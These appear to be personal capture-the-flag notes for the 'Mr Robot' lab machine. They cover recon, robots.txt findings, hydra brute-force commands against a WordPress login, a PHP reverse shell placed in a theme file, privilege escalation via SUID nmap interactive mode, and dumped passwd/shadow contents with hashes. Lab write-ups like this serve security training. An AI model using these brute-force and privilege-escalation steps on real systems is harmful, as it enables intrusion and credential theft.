@@ -1,0 +1,173 @@
+
+
+						recon
+ssh:22
+web:80
+https:443
+
+
+
+						enum
+
+:80/robots.txt
+
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+
+*download fsociety.dic and found a key
+
+
+						exploitation
+
+http://10.10.57.99/wp-login.php
+
+
+*uses POST method 
+
+POST http://10.10.57.99/wp-login.php
+
+
+*timeout takes 4ever, zap and burp not very effective for brute forcing
+
+
+*try hydra 
+
+hydra -L fsocity.dic -p tut 10.10.57.99 http-post-form "/wp-login.php.:log=^USER^&pwd=^PWD^:Invalid username" -t 30 -I > user.txt
+
+
+elliot
+
+hydra -l Eliot -P fsocity.dic 10.10.57.99 http-post-form "/wp-login.php.:log=^USER^&pwd=^PWD^:Invalid password" -t 30 -I > passwd.txt
+
+
+ER28-0652
+
+
+
+
+
+
+
+
+
+						exploitation
+
+*can edit a php file in themes
+
+*compy rev shell php
+
+*now find file 
+
+10.10.57.99/wp-content/themes/twentyfifteen/archive.php
+
+
+*pimpshell
+
+
+
+
+						privesc
+
+robot:c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+
+
+
+$find / -perm -4000 -type f 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+
+
+*nmap
+
+
+*consult gtfobins
+
+https://gtfobins.github.io/gtfobins/nmap/#sudo
+
+$sudo nmap --interactive
+$nmap> !sh
+
+
+
+
+
+
+
+
+						shits&gigs
+
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
+bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
+mysql:x:1001:1001::/home/mysql:
+varnish:x:999:999::/home/varnish:
+robot:x:1002:1002::/home/robot:
+
+
+
+root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5IznY2Re.:16753:0:99999:7:::
+daemon:*:16610:0:99999:7:::
+bin:*:16610:0:99999:7:::
+sys:*:16610:0:99999:7:::
+sync:*:16610:0:99999:7:::
+games:*:16610:0:99999:7:::
+man:*:16610:0:99999:7:::
+lp:*:16610:0:99999:7:::
+mail:*:16610:0:99999:7:::
+news:*:16610:0:99999:7:::
+uucp:*:16610:0:99999:7:::
+proxy:*:16610:0:99999:7:::
+www-data:*:16610:0:99999:7:::
+backup:*:16610:0:99999:7:::
+list:*:16610:0:99999:7:::
+irc:*:16610:0:99999:7:::
+gnats:*:16610:0:99999:7:::
+nobody:*:16610:0:99999:7:::
+libuuid:!:16610:0:99999:7:::
+syslog:*:16610:0:99999:7:::
+sshd:*:16610:0:99999:7:::
+ftp:*:16610:0:99999:7:::
+bitnamiftp:$6$saPiFTAH$7K09sg5oIfkIs5kuMx1R/Um4HNd8O6vF2n8oICEom8VVer0BYATY5wtzdPdP3JeuKbZ4RYBml0THNQv8TSc0s/:16751:0:99999:7:::
+mysql:!:16694:0:99999:7:::
+varnish:!:16694::::::
+robot:$6$HmQCDKcM$mcINMrQFa0Qm7XaUaS5xLEBSeP3bUkr18iwgwTAL8AIfUDYBWG5L8J9.Ukb3gVWUQoYam4G0m.I5qaHBnTddK/:16752:0:99999:7:::
+
+
